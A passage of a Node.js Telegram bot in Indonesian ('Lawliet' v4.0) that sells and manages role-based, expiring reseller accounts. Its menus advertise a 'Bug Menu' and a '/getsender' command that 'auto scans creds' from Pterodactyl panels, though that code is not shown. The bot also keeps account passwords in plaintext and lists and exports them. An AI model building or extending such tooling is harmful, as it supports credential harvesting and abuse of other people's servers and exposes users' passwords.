    username = parts[0].trim();
    password = parts[1].trim();
    duration = parseInt(parts[2].trim());
    customRole = 'member';
  }
  
  if (isNaN(duration) || duration <= 0) {
    return bot.sendMessage(chatId, "❌ Durasi hari harus berupa angka positif!");
  }
  
  if (!username || username.length < 3) {
    return bot.sendMessage(chatId, "❌ Username minimal 3 karakter!");
  }
  
  if (!password || password.length < 3) {
    return bot.sendMessage(chatId, "❌ Password minimal 3 karakter!");
  }
  
  const { allowed, remaining, maxAccounts } = canCreateAccount(userId, role);
  
  if (!allowed) {
    return bot.sendMessage(chatId, 
      "❌ Gagal Membuat Akun!\n\n" +
      "Anda sudah mencapai batas maksimal pembuatan akun (" + maxAccounts + " akun).\n\n" +
      "Role " + role.toUpperCase() + " hanya bisa membuat " + maxAccounts + " akun saja.\n\n" +
      "Silakan hubungi admin untuk upgrade role."
    );
  }
  
  const db = loadDatabase();
  
  if (db.find(u => u.username === username)) {
    return bot.sendMessage(chatId, "❌ Username sudah ada! Gunakan username lain.");
  }
  
  const currentAccounts = db.filter(acc => acc.createdBy === userId);
  if (!UNLIMITED_ROLES.includes(role) && currentAccounts.length >= 1) {
    return bot.sendMessage(chatId, "❌ Anda sudah mencapai batas maksimal akun!");
  }
  
  const expired = new Date();
  expired.setDate(expired.getDate() + duration);
  
  let expiredDateStr = "";
  try {
    expiredDateStr = expired.toISOString().split("T")[0];
  } catch (err) {
    expiredDateStr = new Date().toISOString().split("T")[0];
  }
  
  const newAccount = {
    username,
    password,
    role: customRole,
    createdBy: userId,
    creatorRole: role,
    creatorName: msg.from.first_name,
    createdAt: new Date().toISOString(),
    expiredDate: expiredDateStr
  };
  
  db.push(newAccount);
  saveDatabase(db);
  
  const remainingQuota = UNLIMITED_ROLES.includes(role) ? 'Unlimited' : (1 - (currentAccounts.length + 1));
  const totalAccounts = currentAccounts.length + 1;
  
  let successMessage = 
    "✅ AKUN BERHASIL DIBUAT!\n\n" +
    "👤 Username: " + username + "\n" +
    "🔐 Password: " + password + "\n" +
    "🎭 Role Akun: " + customRole.toUpperCase() + "\n" +
    "⏳ Durasi: " + duration + " hari\n" +
    "📅 Expired: " + expiredDateStr + "\n" +
    "👑 Dibuat oleh: " + role.toUpperCase() + " (" + msg.from.first_name + ")\n" +
    "📊 Total akun Anda: " + totalAccounts + "\n" +
    "📊 Sisa kuota: " + remainingQuota + "\n\n" +
    "Simpan informasi ini dengan baik.";
  
  if (UNLIMITED_ROLES.includes(role)) {
    successMessage += "\n\n💡 Tips: Anda bisa membuat akun dengan role berbeda menggunakan:\n/ckey username,password,durasi,role";
  }
  
  bot.sendMessage(chatId, successMessage);
});

// COMMAND /start atau /menu
const photoUrl = "https://files.catbox.moe/ehqz3h.jpg"; 

const bugRequests = {};
const userButtonColor = {}
const buttonIntervals = new Map()

async function sendStartMenu(chatId, from) {

  const userId = from.id
  const chosenColor = userButtonColor[userId] || "primary"

  let styles

  if (chosenColor === "disco") {
    styles = ["primary","success","danger"]
  }

  else {

    const safeColor = {
      danger: "danger",
      success: "success",
      secondary: "primary"
    }

    styles = [ safeColor[chosenColor] || "primary" ]
  }

  let index = 0

  let keyboard = [
    [
      { text: '📋 ᴀᴋᴜɴ', callback_data: 'buat_akun', style: styles[index] },
      { text: '📊 sᴛᴀᴛɪsᴛɪᴋ ʙᴏᴛ', callback_data: 'creds_menu', style: styles[index] }
    ],
    [
      { text: '⏱️ ᴍᴇɴᴜ ᴀᴅᴍɪɴ', callback_data: 'admin_menu', style: styles[index] }
    ],
    [
      { text: '👀 𝙶𝙴𝚃 𝚂𝙴𝙽𝙳𝙴𝚁', callback_data: 'getsender_menu', style: styles[index] },
      { text: '🪭 ᴏᴡɴᴇʀ', url: 'https://t.me/chicaatractiva', style: styles[index] }
    ]
  ]

  const sent = await bot.sendPhoto(userId, photoUrl, {

    message_effect_id: "5104841245755180586",
 
    caption: `
<blockquote><b>⬡═―—⊱ 𝗟𝗔𝗪𝗟𝗜𝗘𝗧 ⊰―—═⬡</b></blockquote>
Holla ☇ use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
━━━━━━━━━━━━━━━━━━
⬡ Developer : @chicaatractiva
⬡ Support : @ibuluyateam
⬡ Version : 4.0
━━━━━━━━━━━━━━━━━━
<blockquote>🎭 Role yang tersedia: member, reseller, partner, admin, tk, owner, moderator, founder</blockquote>
<blockquote>Select The Button Here!</blockquote>
`,

    parse_mode: "HTML",

    reply_markup: {
      inline_keyboard: keyboard
    }

  })

  const messageId = sent.message_id

  if (styles.length > 1) {

    const intervalId = setInterval(async () => {

      index++
      if (index >= styles.length) index = 0

      let newKeyboard = [
        [
          { text: '📋 ᴀᴋᴜɴ', callback_data: 'buat_akun', style: styles[index] },
      { text: '📊 sᴛᴀᴛɪsᴛɪᴋ ʙᴏᴛ', callback_data: 'creds_menu', style: styles[index] }
    ],
    [
      { text: '⏱️ ᴍᴇɴᴜ ᴀᴅᴍɪɴ', callback_data: 'admin_menu', style: styles[index] }
    ],
    [
      { text: '👀 𝙶𝙴𝚃 𝚂𝙴𝙽𝙳𝙴𝚁', callback_data: 'getsender_menu', style: styles[index] },
      { text: '🪭 ᴏᴡɴᴇʀ', url: 'https://t.me/chicaatractiva', style: styles[index] }
        ]
      ]

      try {

        await bot.editMessageReplyMarkup(
          { inline_keyboard: newKeyboard },
          {
            chat_id: chatId,
            message_id: messageId
          }
        )

      } catch (e) {}

    }, 2000)

    buttonIntervals.set(messageId, intervalId)

  }

}

// ===============================
// START + MENU GABUNG
// ===============================
bot.onText(/^\/?(start|menu)$/, async (msg) => {

  if (msg.chat.type !== 'private') {
    return bot.sendMessage(
      msg.chat.id,
      "❌ Silakan gunakan command ini di Private Chat dengan bot."
    );
  }

  const chatId = msg.chat.id
  const from = msg.from
  const userId = from.id
  const firstName = msg.from.first_name || "User"

  const canAccess = await checkFollowRequirement(
    userId,
    userId,
    'menggunakan bot'
  );

  if (!canAccess) return;

  const { role, isAdmin, isMember } = await getUserRoleFromGroup(userId);

  userRoleCache.set(userId, {
    role,
    isAdmin,
    isMember,
    timestamp: Date.now()
  });

  if (!isMember) {
    return bot.sendMessage(
      userId,
      "❌ Akses Ditolak!\n\nAnda harus menjadi anggota grup terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join ke grup kami terlebih dahulu."
    );
  }

  try {

    await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ehqz3h.jpg",
      {
        caption: `
<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━
( 👁️ ) Holla ${firstName}
Selamat datang di Bot database lawliet Owner bot @chicaatractiva
Gunakan bot ini dengan bijak, tekan tombol di bawah untuk memilih warna button menu utama.

 👑 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @chicaatractiva
 🏆 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 : @ibuluyateam
 🎭 𝗥𝗼𝗹𝗲 : ${role.toUpperCase()}
</b></blockquote>
<blockquote>☰ NOTE: PILIH WARNA BUTTON MENU</blockquote>
`,
        parse_mode:"HTML",
        reply_markup:{
          inline_keyboard:[
            [
              {
                text:"🔴 Merah",
                callback_data:"color_danger"
              },
              {
                text:"🟢 Hijau",
                callback_data:"color_success"
              }
            ],
            [
              {
                text:"🟡 Kuning",
                callback_data:"color_secondary"
              },
              {
                text:"💃 Disko",
                callback_data:"color_disco"
              }
            ]
          ]
        }
      }
    )

  } catch(err) {
    console.log("START ERROR:", err)
  }

})

bot.on("callback_query", async (query) => {

  if (!query.message) return

  const chatId = query.message.chat.id
  const userId = query.from.id
  const messageId = query.message.message_id
  const data = query.data


  if (buttonIntervals.has(messageId)) {

    clearInterval(buttonIntervals.get(messageId))
    buttonIntervals.delete(messageId)

  }


  if (data.startsWith("color_")) {

    const color = data.replace("color_","")

    userButtonColor[userId] = color

    await bot.answerCallbackQuery(query.id,{
      text:"🎨 Warna dipilih"
    })

    await bot.deleteMessage(chatId,messageId).catch(()=>{})

    await sendStartMenu(chatId, query.from)

    return

  }

    await bot.deleteMessage(chatId,messageId).catch(()=>{})


    let caption = ""
    let replyMarkup = {}

    if (data === "buat_akun") {
      selectedImage = "https://files.catbox.moe/lm44f1.jpg"; // Ganti dengan link foto menu bugs
      caption = `<blockquote><b>⬡═―—⊱ 𝗟𝗔𝗪𝗟𝗜𝗘𝗧 ⊰―—═⬡</b></blockquote>
Holla ☇ use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
━━━━━━━━━━━━━━━━━━
⬡ Developer : @chicaatractiva
⬡ Support : @ibuluyateam
⬡ Version : 4.0
━━━━━━━━━━━━━━━━━━
<b>─━━─━━⧼ Ⴕ 𝙵𝙸𝚃𝚄𝚁 𝙰𝙺𝚄𝙽〽️ ⧽─━━─━━:</b>
─▢ /ckey bokep,abc123,30,reseller
─▢ /myakun - Lihat akun yang Anda buat
─▢ /cekkadaluarsa - Cek status expired akun
<pre>──────────────────────────
   MENU: Pilih Fitur Bug Menu di Atas 
──────────────────────────</pre>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙 ⎋メインコース", callback_data: "back_to_main" }]],
      };
    } 
    
    else if (data === "admin_menu") {
      selectedImage = "https://files.catbox.moe/lm44f1.jpg"; // Ganti dengan link foto menu moderator
      caption = `<blockquote><b>⬡═―—⊱ 𝗟𝗔𝗪𝗟𝗜𝗘𝗧 ⊰―—═⬡</b></blockquote>
Holla ☇ use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
━━━━━━━━━━━━━━━━━━
⬡ Developer : @chicaatractiva
⬡ Support : @ibuluyateam
⬡ Version : 4.0
━━━━━━━━━━━━━━━━━━
<b>─━━─━━⧼ Ⴕ 𝙵𝙸𝚃𝚄𝚁 𝙰𝙳𝙼𝙸𝙽〽️ ⧽─━━─━━:</b>
─▢ /semuaakun - Lihat semua akun
─▢ /statakun - Statistik semua akun
─▢ /hapusakun username - Hapus akun
<pre>──────────────────────────
   MENU: Pilih Fitur Bug Menu di Atas 
──────────────────────────</pre>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙 ⎋メインコース", callback_data: "back_to_main" }]],
      };
    } 
    
    else if (data === "getsender_menu") {
      selectedImage = "https://files.catbox.moe/lm44f1.jpg"; // Ganti dengan link foto menu moderator
      caption = `<blockquote><b>⬡═―—⊱ 𝗟𝗔𝗪𝗟𝗜𝗘𝗧 ⊰―—═⬡</b></blockquote>
Holla ☇ use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
━━━━━━━━━━━━━━━━━━
⬡ Developer : @chicaatractiva
⬡ Support : @ibuluyateam
⬡ Version : 4.0
━━━━━━━━━━━━━━━━━━
<b>─━━─━━⧼ Ⴕ 𝙵𝙸𝚃𝚄𝚁 𝙰𝙳𝙼𝙸𝙽〽️ ⧽─━━─━━:</b>
─▢ /getsender - Auto scan creds dari Pterodactyl
  Format: /getsender domain|plta|pltc
<pre>──────────────────────────
   MENU: Pilih Fitur Bug Menu di Atas 
──────────────────────────</pre>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙 ⎋メインコース", callback_data: "back_to_main" }]],
      };
    } 
    
    else if (data === "creds_menu") {
      selectedImage = "https://files.catbox.moe/lm44f1.jpg"; // Ganti dengan link foto menu tools
      caption = `<blockquote><b>⬡═―—⊱ 𝗟𝗔𝗪𝗟𝗜𝗘𝗧 ⊰―—═⬡</b></blockquote>
Holla ☇ use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
━━━━━━━━━━━━━━━━━━
⬡ Developer : @chicaatractiva
⬡ Support : @ibuluyateam
⬡ Version : 4.0
━━━━━━━━━━━━━━━━━━ 
<b>─━━─━━⧼ Ⴕ 𝙵𝙸𝚃𝚄𝚁 𝙲𝙴𝚁𝙳𝚂〽️ ⧽─━━─━━:</b>
─▢ /cekglobal - Lihat semua folder dan nomor di RESELLER
─▢ /ceksender [nama] - Cek detail folder spesifik
─▢ /cekstats - Statistik lengkap bot
<pre>──────────────────────────
   MENU: Pilih Fitur Bug Menu di Atas 
──────────────────────────</pre>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙 ⎋メインコース", callback_data: "back_to_main" }]],
      };
    } 
    
    else if (data === "back_to_main") {
      await sendStartMenu(chatId, query.from);
      return await bot.answerCallbackQuery(query.id);
    }

    if (caption !== "" && selectedImage !== "") {
      await bot.sendPhoto(chatId, selectedImage, {
        caption: caption,
        parse_mode: "HTML",
        reply_markup: replyMarkup
      });
    }

    await bot.answerCallbackQuery(query.id);
});

// COMMAND /myakun
bot.onText(/^\/myakun$/, async (msg) => {
  const userId = msg.from.id;
  
  if (msg.chat.type !== 'private') {
    return bot.sendMessage(msg.chat.id, "❌ Gunakan di Private Chat!");
  }
  
  const canAccess = await checkFollowRequirement(userId, userId, 'melihat akun');
  if (!canAccess) return;
  
  const { isMember } = await getUserRoleFromGroup(userId);
  if (!isMember) {
    return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  }
  
  const db = loadDatabase();
  const myAccounts = db.filter(acc => acc.createdBy === userId);
  
  if (myAccounts.length === 0) {
    return bot.sendMessage(userId, "📭 Anda belum memiliki akun yang dibuat.");
  }
  
  let accountList = "📋 AKUN YANG ANDA BUAT (" + myAccounts.length + "):\n\n";
  myAccounts.forEach((acc, idx) => {
    accountList += (idx + 1) + ". 👤 " + acc.username + " | 🎭 " + acc.role + " | ⏳ Exp: " + acc.expiredDate + "\n";
  });
  
  bot.sendMessage(userId, accountList);
});

// COMMAND /cekkadaluarsa
bot.onText(/^\/cekkadaluarsa$/, async (msg) => {
  const userId = msg.from.id;
  
  if (msg.chat.type !== 'private') {
    return bot.sendMessage(msg.chat.id, "❌ Gunakan di Private Chat!");
  }
  
  const canAccess = await checkFollowRequirement(userId, userId, 'cek expired');
  if (!canAccess) return;
  
  const { isMember } = await getUserRoleFromGroup(userId);
  if (!isMember) {
    return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  }
  
  const db = loadDatabase();
  const myAccounts = db.filter(acc => acc.createdBy === userId);
  
  if (myAccounts.length === 0) {
    return bot.sendMessage(userId, "📭 Anda belum memiliki akun.");
  }
  
  let expiredList = "⏳ STATUS EXPIRED AKUN:\n\n";
  const today = new Date();
  
  myAccounts.forEach((acc, idx) => {
    const expiredDate = new Date(acc.expiredDate);
    const daysLeft = Math.ceil((expiredDate - today) / (1000 * 60 * 60 * 24));
    const status = daysLeft < 0 ? '❌ EXPIRED' : '✅ ' + daysLeft + ' hari lagi';
    
    expiredList += (idx + 1) + ". " + acc.username + " (" + acc.role + ") | " + status + "\n";
  });
  
  bot.sendMessage(userId, expiredList);
});

// COMMAND /statakun
bot.onText(/^\/statakun$/, async (msg) => {
  const userId = msg.from.id;
  
  if (msg.chat.type !== 'private') {
    return bot.sendMessage(msg.chat.id, "❌ Gunakan di Private Chat!");
  }
  
  const canAccess = await checkFollowRequirement(userId, userId, 'lihat statistik');
  if (!canAccess) return;
  
  const { role, isMember } = await getUserRoleFromGroup(userId);
  
  if (!isMember) {
    return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  }
  
  if (!UNLIMITED_ROLES.includes(role)) {
    return bot.sendMessage(userId, "❌ Fitur khusus untuk partner/moderator/owner/tk/founder!");
  }
  
  const db = loadDatabase();
  if (db.length === 0) {
    return bot.sendMessage(userId, "📭 Belum ada akun yang dibuat.");
  }
  
  const roleStats = {};
  const creatorStats = {};
  
  db.forEach(acc => {
    roleStats[acc.role] = (roleStats[acc.role] || 0) + 1;
    const creator = acc.creatorName || 'Unknown';
    creatorStats[creator] = (creatorStats[creator] || 0) + 1;
  });
  
  let statsMessage = "📊 STATISTIK SEMUA AKUN\n\n";
  statsMessage += `📌 Total Akun: ${db.length}\n\n`;
  
  statsMessage += "🎭 Berdasarkan Role:\n";
  for (const [roleName, count] of Object.entries(roleStats)) {
    statsMessage += `- ${roleName.toUpperCase()}: ${count} akun (${((count/db.length)*100).toFixed(1)}%)\n`;
  }
  
  statsMessage += "\n👑 Berdasarkan Pembuat:\n";
  const sortedCreators = Object.entries(creatorStats).sort((a,b) => b[1] - a[1]);
  for (const [creator, count] of sortedCreators.slice(0, 10)) {
    statsMessage += `- ${creator}: ${count} akun\n`;
  }
  
  statsMessage += "\n📌 Gunakan /semuaakun untuk melihat detail lengkap";
  
  bot.sendMessage(userId, statsMessage);
});

// COMMAND /semuaakun
bot.onText(/^\/semuaakun(?:\s+(\d+))?$/, async (msg, match) => {
  const userId = msg.from.id;
  const page = match[1] ? parseInt(match[1]) : 1;
  const ITEMS_PER_PAGE = 15;
  
  if (msg.chat.type !== 'private') {
    return bot.sendMessage(msg.chat.id, "❌ Gunakan di Private Chat!");
  }
  
  const canAccess = await checkFollowRequirement(userId, userId, 'lihat semua akun');
  if (!canAccess) return;
  
  const { role, isMember } = await getUserRoleFromGroup(userId);
  
  if (!isMember) {
    return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  }
  
  if (!UNLIMITED_ROLES.includes(role)) {
    return bot.sendMessage(userId, "❌ Fitur khusus untuk partner/moderator/owner/tk/founder!");
  }
  
  const db = loadDatabase();
  if (db.length === 0) {
    return bot.sendMessage(userId, "📭 Belum ada akun yang dibuat.");
  }
  
  if (db.length <= ITEMS_PER_PAGE) {
    let allList = `📊 SEMUA AKUN (${db.length} akun):\n\n`;
    db.forEach((acc, idx) => {
      allList += `${idx + 1}. 👤 ${acc.username} | 🎭 ${acc.role} | ⏳ ${acc.expiredDate} | 👑 ${acc.creatorRole || 'unknown'} (${acc.creatorName || '-'})\n`;
    });
    
    if (allList.length > 4000) {
      const fileName = `semua_akun_${Date.now()}.txt`;
      const fileContent = `LAPORAN SEMUA AKUN\nTanggal: ${new Date().toLocaleString('id-ID')}\nTotal Akun: ${db.length}\n\n${allList}`;
      fs.writeFileSync(fileName, fileContent, 'utf8');
      await bot.sendDocument(userId, fileName, {
        caption: `📊 SEMUA AKUN\nTotal: ${db.length} akun\n📅 ${new Date().toLocaleString('id-ID')}`
      });
      fs.unlinkSync(fileName);
    } else {
      await bot.sendMessage(userId, allList);
    }
    return;
  }
  
  const totalPages = Math.ceil(db.length / ITEMS_PER_PAGE);
  
  if (page < 1 || page > totalPages) {
    return bot.sendMessage(userId, `❌ Halaman tidak valid! Total halaman: ${totalPages}\nGunakan /semuaakun 1 untuk halaman pertama`);
  }
  
  const startIdx = (page - 1) * ITEMS_PER_PAGE;
  const endIdx = Math.min(startIdx + ITEMS_PER_PAGE, db.length);
  const pageAccounts = db.slice(startIdx, endIdx);
  
  let allList = `📊 SEMUA AKUN (${db.length} total)\n`;
  allList += `📄 Halaman ${page} dari ${totalPages}\n`;
  allList += `📋 Menampilkan akun ${startIdx + 1}-${endIdx}\n\n`;
  
  pageAccounts.forEach((acc, idx) => {
    const globalIdx = startIdx + idx + 1;
    allList += `${globalIdx}. 👤 ${acc.username}\n`;
    allList += `   🎭 Role: ${acc.role.toUpperCase()}\n`;
    allList += `   ⏳ Expired: ${acc.expiredDate}\n`;
    allList += `   👑 Creator: ${acc.creatorRole || 'unknown'} (${acc.creatorName || '-'})\n`;
    allList += `   📅 Dibuat: ${acc.createdAt ? acc.createdAt.split('T')[0] : '-'}\n`;
    allList += `   🔐 Pass: ${acc.password}\n`;
    allList += `   ━━━━━━━━━━━━━━━━━━━━\n`;
  });
  
  allList += `\n📌 Navigasi:\n`;
  if (page > 1) allList += `◀️ /semuaakun ${page - 1} - Halaman sebelumnya\n`;
  if (page < totalPages) allList += `▶️ /semuaakun ${page + 1} - Halaman selanjutnya\n`;
  allList += `📊 /statakun - Lihat statistik\n`;
  allList += `💾 Ketik export untuk download semua data sebagai file`;
  
  await bot.sendMessage(userId, allList);
});

// COMMAND /hapusakun
bot.onText(/^\/hapusakun (.+)$/, async (msg, match) => {
  const userId = msg.from.id;
  
  if (msg.chat.type !== 'private') {
    return bot.sendMessage(msg.chat.id, "❌ Gunakan di Private Chat!");
  }
  
  const canAccess = await checkFollowRequirement(userId, userId, 'hapus akun');
  if (!canAccess) return;
  
  const { role, isMember } = await getUserRoleFromGroup(userId);
  
  if (!isMember) {
    return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  }
  
  if (!UNLIMITED_ROLES.includes(role)) {
    return bot.sendMessage(userId, "❌ Fitur khusus untuk partner/moderator/owner/tk/founder!");
  }
  
  const username = match[1].trim();
  const db = loadDatabase();
  const index = db.findIndex(u => u.username === username);
  
  if (index === -1) {
    return bot.sendMessage(userId, "❌ Username tidak ditemukan.");
  }
  
  const deleted = db.splice(index, 1)[0];
  saveDatabase(db);
  
  bot.sendMessage(userId, 
    "🗑️ AKUN BERHASIL DIHAPUS!\n\n" +
    "Username: " + deleted.username + "\n" +
    "Role: " + deleted.role + "\n" +
    "Dibuat oleh: " + (deleted.creatorRole || 'unknown') + " (" + (deleted.creatorName || '-') + ")"
  );
});

// Handle export
bot.onText(/^export$/, async (msg) => {
  const userId = msg.from.id;
  
  if (msg.chat.type !== 'private') {
    return;
  }
  
  const { role, isMember } = await getUserRoleFromGroup(userId);
  
  if (!isMember || !UNLIMITED_ROLES.includes(role)) {
    return bot.sendMessage(userId, "❌ Anda tidak memiliki akses ke fitur ini!");
  }
  
  const db = loadDatabase();
  if (db.length === 0) {
    return bot.sendMessage(userId, "📭 Belum ada akun yang dibuat.");
  }
  
  const fileName = `export_akun_${Date.now()}.txt`;
  let fileContent = `LAPORAN LENGKAP SEMUA AKUN\n`;
  fileContent += `Tanggal Export: ${new Date().toLocaleString('id-ID')}\n`;
  fileContent += `Total Akun: ${db.length}\n`;
  fileContent += `${'='.repeat(60)}\n\n`;
  
  db.forEach((acc, idx) => {
    fileContent += `${idx + 1}. USERNAME: ${acc.username}\n`;
    fileContent += `   PASSWORD: ${acc.password}\n`;
    fileContent += `   ROLE: ${acc.role.toUpperCase()}\n`;
    fileContent += `   EXPIRED: ${acc.expiredDate}\n`;
    fileContent += `   CREATOR: ${acc.creatorRole || 'unknown'} (${acc.creatorName || '-'})\n`;
    fileContent += `   CREATOR ID: ${acc.createdBy || '-'}\n`;
    fileContent += `   DIBUAT: ${acc.createdAt ? acc.createdAt.split('T')[0] : '-'}\n`;
    fileContent += `${'-'.repeat(60)}\n`;
  });
  
  fs.writeFileSync(fileName, fileContent, 'utf8');
  
  await bot.sendDocument(userId, fileName, {
    caption: `📊 EXPORT DATA LENGKAP\nTotal: ${db.length} akun\n📅 ${new Date().toLocaleString('id-ID')}`
  });
  
  fs.unlinkSync(fileName);
});

// Start the bot
async function startTelegramBot() {
  await initChannelIds();
  
  console.log("🤖 Telegram bot started");
  console.log("✅ Bot berjalan di Private Chat");
  console.log("📢 Wajib follow channel: " + REQUIRED_CHANNELS.map(c => c.username).join(', '));
  console.log("📋 Grup yang diizinkan: " + ALLOWED_GROUPS.length + " grup");
  console.log("📋 Member/RESELLER: maksimal 1 akun (format: /ckey user,pw,durasi)");
  console.log("🚀 Partner/Moderator/Owner/Tk/Founder: UNLIMITED (bisa custom role)");
  console.log("📁 Fitur SCAN RESELLER FOLDER: /cekglobal, /ceksender, /cekstats");
  console.log("🔥 Fitur GETSENDER AUTO SCAN: /getsender domain|plta|pltc");
  console.log("📊 Fitur lainnya: /statakun, pagination untuk /semuaakun");
}

module.exports = {
  bot,
  startTelegramBot
};